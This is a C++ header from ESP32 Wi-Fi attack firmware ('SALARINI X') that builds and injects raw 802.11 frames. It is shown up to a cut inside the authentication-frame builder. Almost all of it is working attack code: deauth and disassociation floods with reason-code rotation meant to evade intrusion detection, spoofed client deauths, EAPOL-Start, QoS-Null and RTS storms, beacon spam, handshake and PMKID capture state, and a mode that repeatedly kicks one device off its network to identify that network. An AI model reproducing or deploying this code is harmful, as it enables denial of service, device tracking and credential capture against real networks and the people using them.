/*
  SALARINI X - AttackEngine.h
  ---------------------------------------------------------------------------
  Real 802.11 frame TX engine ported from the Nova X ESP32-C5 project
  (BSD-2-Clause, https://github.com/warwick320/nova-x) and extended with
  additional attack modes for the SALARINI X merged firmware.

  Board target : Waveshare ESP32-C5-Touch-LCD-3.5 (ESP32-C5, Arduino core 3.3.x)
  Frame TX     : esp_wifi_80211_tx() in STA mode, raw IEEE 802.11 frames.

  Legal: for AUTHORIZED security testing and education on networks you own
  or have written permission to test. Unauthorized use is illegal.
  ---------------------------------------------------------------------------
*/
#pragma once

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types_generic.h>
#include <esp_system.h>
#include <algorithm>
#include <array>
#include <cstring>
#include <vector>
#include <map>

// ---------------------------------------------------------------------------
// Hooks implemented by the main sketch (same translation unit via .ino include)
// ---------------------------------------------------------------------------
static void snifferHookMonitor(wifi_promiscuous_pkt_type_t type, uint8_t subtype, uint8_t channel, uint16_t len);
static void snifferHookEAPOL(uint8_t channel);
// BLE bridge implemented in the main sketch (non-static, links within this TU)
void bleSpamStopBridge();
// V23.2 DUAL MODE: with the switch ON (Settings > DUAL MODE, saved to prefs)
// EVERY Wi-Fi TX attack pulls the second board (SX-DRONE) in automatically.
// POD target struct so the hooks can live at global scope; both hooks are
// implemented by the main sketch (same translation unit).
struct DualTarget { uint8_t bssid[6]; uint8_t channel; };
static void hookDualAttackStart(const char* title, const DualTarget* targets, size_t count);
static void hookDualAttackStop();

namespace ae {

static constexpr uint8_t  PER_PKT = 10;          // frames per target per tick (Nova X value)
static constexpr size_t   MAX_STAS = 96;         // tracked stations cap (V25: 96)
// V25: stations used to vanish after 60 s (phones doze, bursts are short) -
// the field report was "van y desaparecen". 4 minutes now, and a full
// registry evicts the STALEST entry instead of dropping the new client.
static constexpr uint32_t STA_TIMEOUT_MS = 240000;

// ---------------------------------------------------------------------------
// Attack power profile, user selectable: LOW / MED / MAX.
// LOW: half bursts, double pacing (gentle stress test)
// MED: Nova X reference rates
// MAX: double bursts, reference pacing (maximum pressure)
// ---------------------------------------------------------------------------
enum class Power : uint8_t { PWR_LOW=0, PWR_MED=1, PWR_MAX=2 };
static Power sPower = Power::PWR_MED;
static void setPowerLevel(Power p){ sPower = p; }
static Power powerLevel(){ return sPower; }
static inline uint8_t burstCount(){
  return (sPower==Power::PWR_LOW) ? (uint8_t)(PER_PKT/2)
       : (sPower==Power::PWR_MAX) ? (uint8_t)(PER_PKT*2) : PER_PKT;
}
static inline uint32_t tickMul(){
  return (sPower==Power::PWR_LOW) ? 2u : 1u;
}

// Non-DFS attack channel plan: 2.4 GHz 1-13 + common 5 GHz primaries.
static const uint8_t ATTACK_CHANNELS[] = {
  1,2,3,4,5,6,7,8,9,10,11,12,13,
  36,40,44,48,149,153,157,161,165
};
static constexpr uint8_t ATTACK_CHANNEL_COUNT = sizeof(ATTACK_CHANNELS)/sizeof(ATTACK_CHANNELS[0]);

// Full channel plan used by the station scanner (includes DFS RX-only channels).
static const uint8_t SCAN_CHANNELS[] = {
  1,2,3,4,5,6,7,8,9,10,11,12,13,
  36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,
  149,153,157,161,165
};
static constexpr uint8_t SCAN_CHANNEL_COUNT = sizeof(SCAN_CHANNELS)/sizeof(SCAN_CHANNELS[0]);

// ---------------------------------------------------------------------------
// Public data types
// ---------------------------------------------------------------------------
struct TargetAP {
  uint8_t bssid[6];
  char    ssid[33];
  uint8_t channel;
  bool    encrypted;
  int8_t  rssi;                 // signal of the scan row that produced this target
  TargetAP() : channel(1), encrypted(false), rssi(-128) {
    memset(bssid, 0, 6); memset(ssid, 0, sizeof(ssid));
  }
};

struct TargetSTA {
  uint8_t sta[6];
  uint8_t ap[6];
  uint8_t channel;
  TargetSTA() : channel(1) { memset(sta,0,6); memset(ap,0,6); }
};

struct STAInfo {
  uint8_t  sta[6];
  uint8_t  ap[6];
  uint32_t lastSeen;
  uint32_t pkts;
  uint8_t  channel;             // channel the client was last heard on
  int8_t   rssi;                // V25: signal of the last frame from it
  STAInfo() : lastSeen(0), pkts(0), channel(1), rssi(-128) { memset(sta,0,6); memset(ap,0,6); }
};

enum class AttackType : uint8_t {
  NONE = 0,
  // Deauth
  DEAUTH_ALL, DEAUTH_CHANNEL, DEAUTH_SELECTED, DEAUTH_STA_SELECTED, DEAUTH_STA_ALL, DEAUTH_STORM,
  // Auth
  AUTH_ALL, AUTH_CHANNEL, AUTH_SELECTED,
  // Assoc
  ASSOC_ALL, ASSOC_CHANNEL, ASSOC_SELECTED,
  // Beacon
  BEACON_DUP_ALL, BEACON_DUP_SELECTED, BEACON_RANDOM, BEACON_CHANNEL,
  BEACON_PREFIX, BEACON_RICKROLL, BEACON_FAKERANDOM,
  // Spoof / karma
  SPOOF_AP, PROBE_KARMA,
  // Combo / advanced
  EVIL_TWIN, DEAUTH_RICKROLL, TOTAL_OUTAGE,
  // Advanced capture attacks
  HS_CAPTURE, PMKID_GRAB,
  // V18 additions
  DEAUTH_TWO_WAY,   // bidirectional WIDS-evasive deauth
  PROBE_FLOOD,      // probe-response flood: fills every Wi-Fi list nearby
  CLIENT_HUNT,      // passive client capture on one AP + auto-kick loop
  // V20 additions
  EAPOL_FLOOD,      // 802.1X EAPOL-Start storm: exhausts AP auth contexts
  QOS_NULL_FLOOD,   // QoS-Null power-save storm: AP retry-buffer pressure
  RTS_FLOOD,        // RTS control-frame storm: saturates shared airtime
  // V25: FIND WIFI - kick one device forever and watch WHICH network it
  // runs back to. The sniffer links the client to its AP BSSID, waits for
  // the AP beacon to reveal the name, and the user confirms or skips.
  FIND_WIFI
};

enum class BLELink : uint8_t { NONE = 0, APPLE, SAMSUNG, ANDROID, WINDOWS, ALL_SEQ, RANDOM };

// ---------------------------------------------------------------------------
// Engine state
// ---------------------------------------------------------------------------
static AttackType   sType = AttackType::NONE;
static bool         sRunning = false;
static String       sTitle = "";
static String       sTarget = "";
static uint32_t     sTxCount = 0;          // total TX frames this attack
static uint32_t     sRate = 0;             // frames per second (1 s window)
static uint32_t     sWinCount = 0;
static uint32_t     sWinLastMs = 0;
static uint32_t     sStartedMs = 0;
static uint8_t      sChannel = 1;
static uint8_t      sHopIdx = 0;
static size_t       sCurTarget = 0;
static uint32_t     sLastTickMs = 0;
static uint32_t     sSweepCount = 0;
static uint32_t     sLastDeauthBurst = 0;
static uint32_t     sLastProbeResp = 0;
static uint32_t     sLastHopMs = 0;        // channel-hop pacing (PROBE_FLOOD)
static uint8_t      sBeaconRotate = 0;
static String       sBeaconPrefix = "SALARINI";
static bool         sUseBLE = false;       // combo attacks drive BLE spam
static BLELink      sBLELink = BLELink::NONE;

static std::vector<TargetAP>  sTargets;
static std::vector<TargetSTA> sStaTargets;
static std::vector<TargetAP>  sKnownAPs;                      // synced from UI scan
static std::map<std::array<uint8_t,6>, size_t> sAPLookup;     // bssid -> index in sKnownAPs
static std::vector<STAInfo>   sSTAs;

// STA scan
static bool     sStaScanActive = false;
static uint8_t  sStaScanChIdx = 0;
static uint32_t sStaScanLastHop = 0;

// Karma / probe-request capture
struct ProbeReq { uint8_t sender[6]; uint8_t channel; uint32_t ts; };
static std::vector<ProbeReq> sProbeQ;
static bool sKarmaActive = false;

// Promiscuous gate
static volatile bool sPromiscOn = false;

// ---------------------------------------------------------------------------
// Utility
// ---------------------------------------------------------------------------
static inline bool macBroadcast(const uint8_t* m){ return m[0]==0xFF&&m[1]==0xFF&&m[2]==0xFF&&m[3]==0xFF&&m[4]==0xFF&&m[5]==0xFF; }
static inline bool macNull(const uint8_t* m){ return m[0]==0&&m[1]==0&&m[2]==0&&m[3]==0&&m[4]==0&&m[5]==0; }
static inline bool macMulticast(const uint8_t* m){ return (m[0]&0x01)!=0; }

static void randomClientMAC(uint8_t* mac){
  for(int i=0;i<6;i++) mac[i]=(uint8_t)random(0,256);
  mac[0] = (uint8_t)((mac[0] & 0xFE) | 0x02);   // locally administered, unicast
}

static void randomBSSID(uint8_t* mac){
  for(int i=0;i<6;i++) mac[i]=(uint8_t)random(0,256);
  mac[0] = (uint8_t)((mac[0] & 0xFE) | 0x02);
}

// V25: copy a length-checked SSID out of a raw 802.11 frame IE region.
// in[0]=tag, in[1]=len, SSID bytes follow. Returns false for hidden/absent.
static bool copySSIDFromIE(const uint8_t* d, uint16_t ieOff, uint16_t len, char out[33]){
  out[0]=0;
  if(len < (uint16_t)(ieOff+2)) return false;
  if(d[ieOff] != 0x00) return false;                 // not the SSID tag
  uint8_t sl = d[ieOff+1];
  if(sl == 0 || sl > 32) return sl==0 ? false : false; // hidden or oversized
  if(len < (uint16_t)(ieOff+2+sl)) return false;
  memcpy(out, &d[ieOff+2], sl); out[sl]=0;
  for(uint8_t i=0;i<sl;i++){ char c=out[i]; if(c<32 || c>126) out[i]='?'; }
  return true;
}

static void randomSSID(char* out, size_t maxLen){
  static const char charset[]="abcdefghijklmnopqrstuvwxyz0123456789";
  size_t len = 6 + (size_t)random(0,7);
  if(len > maxLen) len = maxLen;
  for(size_t i=0;i<len;i++) out[i]=charset[random(0,(long)(sizeof(charset)-1))];
  out[len]=0;
}

// Bypass hook kept from Nova X (Arduino core may gate raw frame injection).
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t, int32_t){
  return (arg == 31337) ? 1 : 0;
}

static bool sChannelPinned = false;   // V25: does sChannel match the radio?
static bool setChannelForce(uint8_t channel);   // V25 fwd (used by setChannel)

// V25: re-pinning the SAME channel thousands of times per second starves the
// RX path (this alone broke handshake capture: esp_wifi_set_channel() was
// called on every service tick). Same-channel calls now early-out; force
// re-pins after band/softAP recalibration with setChannelForce().
static bool setChannel(uint8_t channel){
  if(channel < 1) return false;
  if(sChannelPinned && channel == sChannel) return true;
  return setChannelForce(channel);
}
static bool setChannelForce(uint8_t channel){
  if(channel < 1) return false;
  esp_wifi_set_band_mode(WIFI_BAND_MODE_AUTO);
  esp_err_t rc = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  if(rc == ESP_OK){ sChannel = channel; sChannelPinned = true; return true; }
  return false;
}

static uint8_t getChannel(){ return sChannel; }

// ---------------------------------------------------------------------------
// Known AP registry (synced from the UI scan results)
// ---------------------------------------------------------------------------
static void clearKnownAPs(){ sKnownAPs.clear(); sAPLookup.clear(); }

static void addKnownAP(const uint8_t* bssid, const char* ssid, uint8_t channel, bool encrypted){
  if(!bssid) return;
  std::array<uint8_t,6> key; memcpy(key.data(), bssid, 6);
  if(sAPLookup.find(key) != sAPLookup.end()) return;
  TargetAP ap;
  memcpy(ap.bssid, bssid, 6);
  strncpy(ap.ssid, ssid ? ssid : "", 32); ap.ssid[32]=0;
  ap.channel = channel; ap.encrypted = encrypted;
  sKnownAPs.push_back(ap);
  sAPLookup[key] = sKnownAPs.size()-1;
}

static int findKnownAP(const uint8_t* bssid){
  std::array<uint8_t,6> key; memcpy(key.data(), bssid, 6);
  auto it = sAPLookup.find(key);
  if(it == sAPLookup.end()) return -1;
  return (int)it->second;
}

static TargetAP* knownAPAt(size_t idx){
  if(idx >= sKnownAPs.size()) return nullptr;
  return &sKnownAPs[idx];
}

static size_t knownAPCount(){ return sKnownAPs.size(); }

// Sort targets strongest-signal first: DEAUTH ALL hits the closest networks
// before the far ones, exactly as the user requested.
static void sortTargetsByRSSI(std::vector<TargetAP> &v){
  std::sort(v.begin(),v.end(),[](const TargetAP &a,const TargetAP &b){ return a.rssi > b.rssi; });
}

// ---------------------------------------------------------------------------
// Handshake / PMKID capture state (filled by the promiscuous sniffer)
// ---------------------------------------------------------------------------
struct HSState {
  uint8_t  bssid[6];
  uint8_t  channel;
  bool     m1,m2,m3,m4;
  bool     pmkidOK;
  bool     complete;
  uint8_t  pmkid[16];
  HSState() : channel(1), m1(false),m2(false),m3(false),m4(false),pmkidOK(false),complete(false) {
    memset(bssid,0,6); memset(pmkid,0,16);
  }
};
static HSState sHS;
struct EapolRec { uint16_t len; uint8_t ch; uint8_t data[240]; };
static EapolRec sHsRing[10];
static volatile uint8_t sHsHead=0, sHsTail=0;
static void hsResetTargets(){ sHS=HSState(); sHsHead=0; sHsTail=0; }
static const HSState* hsState(){ return &sHS; }
static bool hsRingPop(EapolRec &out){
  if(sHsHead==sHsTail) return false;
  out=sHsRing[sHsTail];
  sHsTail=(uint8_t)((sHsTail+1)%10);
  return true;
}
static void hsRingPush(const uint8_t* d, uint16_t len, uint8_t ch){
  EapolRec &r = sHsRing[sHsHead];
  r.len = (len>240)?240:len;
  r.ch = ch;
  memcpy(r.data, d, r.len);
  sHsHead=(uint8_t)((sHsHead+1)%10);
  if(sHsHead==sHsTail) sHsTail=(uint8_t)((sHsTail+1)%10);  // drop oldest
}

// ---------------------------------------------------------------------------
// V25 FIND WIFI: which network does THIS device belong to?
// User hands us one client MAC (from the station scan). We hop the chosen
// band and keep deauthing that client with every kick variant that makes a
// station re-scan / re-associate. Any frame the client emits reveals its AP
// BSSID; once we lock onto that AP we stay on its channel, keep kicking and
// wait for its BEACON to hand us the name (probe requests from the client
// reveal hidden names too). The user confirms ("that is the wifi") or skips
// to keep hunting. Runs until stopped - exactly the requested behavior.
// ---------------------------------------------------------------------------
struct FindNet {
  uint8_t  bssid[6];
  uint8_t  channel;
  int8_t   rssi;
  uint32_t frames;
  uint32_t lastSeen;
  char     ssid[33];
  bool     hasSsid;
  bool     hidden;      // AP heard, name never broadcast (hidden SSID)
  bool     skipped;     // user said "next"
  FindNet() : channel(1), rssi(-128), frames(0), lastSeen(0), hasSsid(false), hidden(false), skipped(false) {
    memset(bssid,0,6); memset(ssid,0,33);
  }
};
static constexpr size_t FIND_NET_MAX = 8;
static FindNet  sFindNets[FIND_NET_MAX];
static size_t   sFindCount = 0;
static uint8_t  sFindSta[6];            // the device we are interrogating
static bool     sFindHasSta = false;
static bool     sFindBand24 = true;     // 2.4 GHz or 5 GHz hunt
static int      sFindLock = -1;         // index into sFindNets when locked
static uint32_t sFindLastHopMs = 0;
static uint32_t sFindLastKickMs = 0;
static uint8_t  sFindHopIdx = 0;
static const uint8_t  FIND_CH_24[] = { 1,2,3,4,5,6,7,8,9,10,11,12,13 };
static const uint8_t  FIND_CH_5G[] = { 36,40,44,48,149,153,157,161,165 };
static constexpr uint8_t FIND_CH_24_COUNT = sizeof(FIND_CH_24)/sizeof(FIND_CH_24[0]);
static constexpr uint8_t FIND_CH_5G_COUNT = sizeof(FIND_CH_5G)/sizeof(FIND_CH_5G[0]);

static void findReset(){
  for(size_t i=0;i<FIND_NET_MAX;i++) sFindNets[i]=FindNet();
  sFindCount = 0; sFindLock = -1; sFindHopIdx = 0;
  sFindLastHopMs = 0; sFindLastKickMs = 0;
  memset(sFindSta,0,6); sFindHasSta = false;
}
static void findBegin(const uint8_t* sta, bool band24){
  findReset();
  sFindBand24 = band24;
  if(sta){ memcpy(sFindSta,sta,6); sFindHasSta = true; }
}
static size_t findCount(){ return sFindCount; }
static const FindNet* findNetAt(size_t i){ return (i<sFindCount)?&sFindNets[i]:nullptr; }
static int findLock(){ return sFindLock; }
static bool findBand24(){ return sFindBand24; }
static const uint8_t* findStaMac(){ return sFindSta; }
// "PASE AL SIGUIENTE": never consider this network again.
static void findSkip(size_t i){
  if(i>=sFindCount) return;
  sFindNets[i].skipped = true;
  if(sFindLock == (int)i) sFindLock = -1;
}
// "ESE ES": stop on the confirmed network.
static bool findConfirm(size_t i){
  if(i>=sFindCount) return false;
  sFindLock = (int)i;
  return true;
}

// Find-or-create a candidate network entry (called from the sniffer!).
static void findObserveAP(const uint8_t* ap, uint8_t ch, int8_t rssi){
  if(!ap || macNull(ap) || macBroadcast(ap) || macMulticast(ap)) return;
  FindNet *hit = nullptr;
  for(size_t i=0;i<sFindCount;i++){
    if(memcmp(sFindNets[i].bssid, ap, 6)==0){ hit=&sFindNets[i]; break; }
  }
  if(!hit){
    if(sFindCount >= FIND_NET_MAX) return;
    hit = &sFindNets[sFindCount++];
    memcpy(hit->bssid, ap, 6);
    hit->channel = ch;
  }
  hit->frames++;
  hit->lastSeen = millis();
  hit->channel = ch;
  if(rssi > hit->rssi) hit->rssi = rssi;
}

// Record the name of an AP we already track (beacon / probe response / probe request).
static void findNoteSsid(const uint8_t* ap, const char* ssid){
  for(size_t i=0;i<sFindCount;i++){
    if(ap && memcmp(sFindNets[i].bssid, ap, 6)!=0) continue;
    if(ssid && ssid[0]){
      strncpy(sFindNets[i].ssid, ssid, 32); sFindNets[i].ssid[32]=0;
      sFindNets[i].hasSsid = true; sFindNets[i].hidden = false;
    } else if(!sFindNets[i].hasSsid){
      sFindNets[i].hidden = true;    // beacon seen but SSID field empty
    }
    return;
  }
}

// Three kick variants that together disconnect virtually every client even
// when we do NOT know its AP: classic AP->STA, self-addressed, and a
// broadcast "logoff" sourced from the client.
static void txFindKick(uint8_t ch){
  // 26-byte deauth built inline (this sits above DEAUTH_TMPL in the header):
  // FC=C0/3A, addr1..3 zero-filled below, seq 0, reason set per variant.
  static const uint8_t FF[6] = { 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF };
  setChannel(ch);
  uint8_t pkt[26];
  memset(pkt,0,sizeof(pkt));
  pkt[0]=0xC0; pkt[2]=0x3A; pkt[3]=0x01; pkt[24]=0x07;
  // v1: da = client, sa = broadcast (classic directed deauth)
  memcpy(&pkt[4], sFindSta, 6);
  esp_wifi_80211_tx(WIFI_IF_STA, pkt, 26, false);
  // v2: da = sa = client (self-deauth; several stacks act on it)
  memcpy(&pkt[10], sFindSta, 6); memcpy(&pkt[16], sFindSta, 6);
  esp_wifi_80211_tx(WIFI_IF_STA, pkt, 26, false);
  // v3: da = broadcast, sa = client (client logoff, disassoc flavour)
  memcpy(&pkt[4], FF, 6);
  pkt[0] = 0xA0; pkt[24] = 0x04;
  esp_wifi_80211_tx(WIFI_IF_STA, pkt, 26, false);
  sTxCount += 3; sWinCount += 3;
}

// ---------------------------------------------------------------------------
// Station registry (filled by the promiscuous sniffer)
// ---------------------------------------------------------------------------
static void clearSTAs(){ sSTAs.clear(); }
static size_t staCount(){ return sSTAs.size(); }
static STAInfo* staAt(size_t i){ return (i < sSTAs.size()) ? &sSTAs[i] : nullptr; }

// V20: `ap` may be nullptr / all-zero = client heard without a known AP.
// This is the root fix for "some stations are never scanned": clients whose
// AP was not part of the AP scan results used to be dropped entirely.
// V25: carries the frame RSSI and, on a full registry, evicts the STALEST
// entry instead of silently dropping every new client (the other half of
// the "stations vanish / never appear" field report).
static void addOrUpdateSTA(const uint8_t* sta, const uint8_t* ap, uint8_t channel, int8_t rssi){
  if(macBroadcast(sta) || macNull(sta) || macMulticast(sta)) return;
  if(ap && (macNull(ap) || macBroadcast(ap))) ap = nullptr;   // unknown AP
  if(ap && memcmp(sta, ap, 6) == 0) return;                   // echo / loop
  for(auto &s : sSTAs){
    if(memcmp(s.sta, sta, 6) == 0){
      s.lastSeen = millis(); s.pkts++;
      s.channel = channel;
      if(rssi > -127) s.rssi = rssi;
      if(ap && memcmp(s.ap, ap, 6) != 0) memcpy(s.ap, ap, 6);
      return;
    }
  }
  if(sSTAs.size() >= MAX_STAS){
    size_t oldest = 0;
    for(size_t i=1;i<sSTAs.size();++i) if(sSTAs[i].lastSeen < sSTAs[oldest].lastSeen) oldest = i;
    sSTAs.erase(sSTAs.begin() + (long)oldest);
  }
  STAInfo s;
  memcpy(s.sta, sta, 6);
  if(ap) memcpy(s.ap, ap, 6); else memset(s.ap, 0, 6);
  s.channel = channel;
  s.rssi = rssi;
  s.lastSeen = millis(); s.pkts = 1;
  sSTAs.push_back(s);
  // NOTE: no Serial prints inside the promiscuous callback - they stall the
  // radio task and cause visible UI lag during scans.
}

static void staSweep(){
  uint32_t now = millis();
  sSTAs.erase(std::remove_if(sSTAs.begin(), sSTAs.end(),
    [now](const STAInfo &s){ return (now - s.lastSeen) > STA_TIMEOUT_MS; }), sSTAs.end());
}

// V25: strongest-signal-first ordering for the station list (called on scan
// start, never per-frame, so rows do not jump under the finger).
static void sortSTAsByRSSI(){
  std::sort(sSTAs.begin(), sSTAs.end(),
    [](const STAInfo &a, const STAInfo &b){ return a.rssi > b.rssi; });
}

// ---------------------------------------------------------------------------
// Raw frame builders (ported from Nova X wifiP.cpp)
// ---------------------------------------------------------------------------
// 802.11 deauthentication, reason 7 (Class 3 frame from nonassociated STA)
static const uint8_t DEAUTH_TMPL[26] PROGMEM = {
  0xC0, 0x00, 0x3A, 0x01,
  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
  0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,
  0x07,0x00
};

// WIDS-evasion: rotate deauth reason codes and mix disassociation frames so
// signature-based defense systems cannot lock onto a single template.
// 7  = Class 3 from nonassociated STA (classic)
// 4  = inactivity (looks like natural AP-side timeout)
// 15 = 4-way handshake timeout (looks like failed WPA exchange)
static inline uint8_t rotateReason(uint8_t i){
  static const uint8_t REASONS[3] = { 7, 4, 15 };
  return REASONS[i % 3];
}

// Also used for disassociation (0xA0) variant
static void txDeauthBSSID(const uint8_t* bssid, uint8_t channel){
  if(!bssid) return;
  setChannel(channel);
  uint8_t pkt[26];
  memcpy_P(pkt, DEAUTH_TMPL, 26);
  memcpy(&pkt[10], bssid, 6);   // addr2 source  = AP
  memcpy(&pkt[16], bssid, 6);   // addr3 BSSID   = AP
  for(uint8_t i=0;i<burstCount();i++){
    pkt[0]  = ((i % 4) == 3) ? 0xA0 : 0xC0;   // every 4th frame: disassoc
    pkt[24] = rotateReason(i);                 // rotating reason codes
    esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
    sTxCount++; sWinCount++;
  }
}

// Directional deauth: kicks one client (dest = STA, source = AP)
static void txDeauthSTA(const uint8_t* sta, const uint8_t* ap, uint8_t channel){
  if(!sta || !ap) return;
  setChannel(channel);
  uint8_t pkt[26];
  memcpy_P(pkt, DEAUTH_TMPL, 26);
  memcpy(&pkt[4],  sta, 6);     // addr1 dest    = STA
  memcpy(&pkt[10], ap,  6);     // addr2 source  = AP
  memcpy(&pkt[16], ap,  6);     // addr3 BSSID   = AP
  for(uint8_t i=0;i<burstCount();i++){
    pkt[0]  = ((i % 4) == 3) ? 0xA0 : 0xC0;
    pkt[24] = rotateReason(i);
    esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
    sTxCount++; sWinCount++;
  }
}

// Client-side logoff: deauth that appears to come FROM a client TO the AP.
// The AP tears down the client state; combined with the AP->STA direction
// this two-way pressure defeats one-way WIDS filters. Fills in the missing
// direction most deauthers never send.
static void txDeauthFromClient(const uint8_t* ap, uint8_t channel){
  uint8_t fake[6]; randomClientMAC(fake);
  setChannel(channel);
  uint8_t pkt[26];
  memcpy_P(pkt, DEAUTH_TMPL, 26);
  memcpy(&pkt[4],  ap,   6);    // addr1 dest    = AP
  memcpy(&pkt[10], fake, 6);    // addr2 source  = client (spoofed)
  memcpy(&pkt[16], ap,   6);    // addr3 BSSID   = AP
  for(uint8_t i=0;i<burstCount();i++){
    pkt[0]  = ((i % 3) == 2) ? 0xA0 : 0xC0;
    pkt[24] = rotateReason(i + 1);
    esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
    sTxCount++; sWinCount++;
  }
}

// Disassociation frame (subtype 0xA0), reason 7
static void txDisassocSTA(const uint8_t* sta, const uint8_t* ap, uint8_t channel){
  if(!sta || !ap) return;
  setChannel(channel);
  uint8_t pkt[26];
  memcpy_P(pkt, DEAUTH_TMPL, 26);
  pkt[0] = 0xA0;
  memcpy(&pkt[4],  sta, 6);
  memcpy(&pkt[10], ap,  6);
  memcpy(&pkt[16], ap,  6);
  for(uint8_t i=0;i<burstCount();i++){
    esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
    sTxCount++; sWinCount++;
  }
}

// ---------------------------------------------------------------------------
// V20 attack frame builders
// ---------------------------------------------------------------------------

// EAPOL-Start (802.1X): every frame makes the authenticator allocate
// supplicant context for a client that never completes the exchange -
// classic 802.1X resource exhaustion (enterprise + some SOHO routers).
static void txEapolStart(const uint8_t* ap, uint8_t channel){
  if(!ap) return;
  uint8_t sta[6]; randomClientMAC(sta);
  setChannel(channel);
  uint8_t pkt[36];
  memset(pkt,0,sizeof(pkt));
  pkt[0]=0x08; pkt[1]=0x01;                 // Data, ToDS
  memcpy(&pkt[4], ap, 6);                   // addr1 = AP
  memcpy(&pkt[10], sta, 6);                 // addr2 = fake client
  memcpy(&pkt[16], ap, 6);                  // addr3 = BSSID
  static const uint8_t LLC[8]={0xAA,0xAA,0x03,0x00,0x00,0x00,0x88,0x8E};
  memcpy(&pkt[24],LLC,8);
  pkt[32]=0x01; pkt[33]=0x01;               // EAPOL v1, EAPOL-Start
  pkt[34]=0x00; pkt[35]=0x00;               // packet body length 0
  for(uint8_t i=0;i<burstCount();i++){
    esp_wifi_80211_tx(WIFI_IF_STA,pkt,36,false);
    sTxCount++; sWinCount++;
  }
}

// QoS-Null (power-save) data frame: announces traffic for a dozing client
// that never wakes, filling AP retry buffers and burning retransmit airtime.
static void txQosNull(const uint8_t* ap, uint8_t channel){
  if(!ap) return;
  uint8_t sta[6]; randomClientMAC(sta);
  setChannel(channel);
  uint8_t pkt[26];
  memset(pkt,0,sizeof(pkt));
  pkt[0]=0x94; pkt[1]=0x01;                 // QoS Null (no data), ToDS
  memcpy(&pkt[4], ap, 6);
  memcpy(&pkt[10], sta, 6);
  memcpy(&pkt[16], ap, 6);
  pkt[24]=0x07; pkt[25]=0x00;               // QoS control: EOSP+Ack bits
  for(uint8_t i=0;i<burstCount();i++){
    esp_wifi_80211_tx(WIFI_IF_STA,pkt,26,false);
    sTxCount++; sWinCount++;
  }
}

// RTS control-frame storm: each frame reserves airtime through the NAV
// timer that is never released by a CTS, choking medium access for every
// device sharing the channel.
static void txRtsFrame(const uint8_t* ap, uint8_t channel){
  if(!ap) return;
  uint8_t sta[6]; randomClientMAC(sta);
  setChannel(channel);
  uint8_t pkt[16];
  memset(pkt,0,sizeof(pkt));
  pkt[0]=0xB4; pkt[1]=0x00;                 // RTS control frame
  pkt[2]=0x2C; pkt[3]=0x01;                 // duration 300us -> long NAV
  memcpy(&pkt[4], ap, 6);                   // receiver = AP
  memcpy(&pkt[10], sta, 6);                 // transmitter = fake client
  for(uint8_t i=0;i<(uint8_t)(burstCount()*2);i++){
    esp_wifi_80211_tx(WIFI_IF_STA,pkt,16,false);
    sTxCount++; sWinCount++;
  }
}
// ---------------------------------------------------------------------------
// Beacon frame builder
// ---------------------------------------------------------------------------
static void txBeaconFrame(const char* ssid, uint8_t channel, const uint8_t* bssid, bool encrypted){
  if(!ssid || !bssid) return;
  uint8_t ssidLen = (uint8_t)strlen(ssid);
  if(ssidLen > 32) ssidLen = 32;

  static const uint8_t BEACON_OPEN[38] PROGMEM = {
    0x80,0x00, 0x00,0x00,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0xE8,0x03,
    0x01,0x04
  };
  static const uint8_t BEACON_ENC[38] PROGMEM = {
    0x80,0x00, 0x00,0x00,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0xE8,0x03,
    0x11,0x04
  };

  uint8_t pkt[128];
  memcpy_P(pkt, encrypted ? BEACON_ENC : BEACON_OPEN, 38);
  memcpy(&pkt[10], bssid, 6);
  memcpy(&pkt[16], bssid, 6);

  int idx = 38;
  pkt[idx++] = 0x00;                 // SSID element
  pkt[idx++] = ssidLen;
  memcpy(&pkt[idx], ssid, ssidLen); idx += ssidLen;

  static const uint8_t RATES[10] PROGMEM = { 0x01,0x08,0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24 };
  memcpy_P(&pkt[idx], RATES, 10); idx += 10;

  pkt[idx++] = 0x03;                 // DS parameter set
  pkt[idx++] = 0x01;
  pkt[idx++] = channel;

  if(encrypted){
    static const uint8_t RSN[26] PROGMEM = {
      0x30,0x18,
      0x01,0x00,
      0x00,0x0F,0xAC,0x04,
      0x01,0x00,
      0x00,0x0F,0xAC,0x04,
      0x01,0x00,
      0x00,0x0F,0xAC,0x02,
      0x00,0x00
    };
    memcpy_P(&pkt[idx], RSN, 26); idx += 26;
  }

  setChannel(channel);
  for(uint8_t i=0;i<burstCount();i++){
    esp_wifi_80211_tx(WIFI_IF_STA, pkt, idx, false);
    sTxCount++; sWinCount++;
  }
}

// ---------------------------------------------------------------------------
// Authentication frame (open system) with randomized client MAC
// ---------------------------------------------------------------------------
static const uint8_t HT_CAPS[28] PROGMEM = {
  0x2D,0x1A,
  0xEF,0x09,
  0x17,
  0xFF,0xFF,0xFF,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,
  0x00,0x00,0x00,0x00,
  0x00
};

static void txAuthFrame(const uint8_t* bssid, uint8_t channel){
  if(!bssid) return;
  static const uint8_t AUTH_TMPL[30] PROGMEM = {
    0xB0,0x00,
    0x3A,0x01,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,
    0x00,0x00,
    0x01,0x00,
    0x00,0x00
  };
  uint8_t pkt[128];
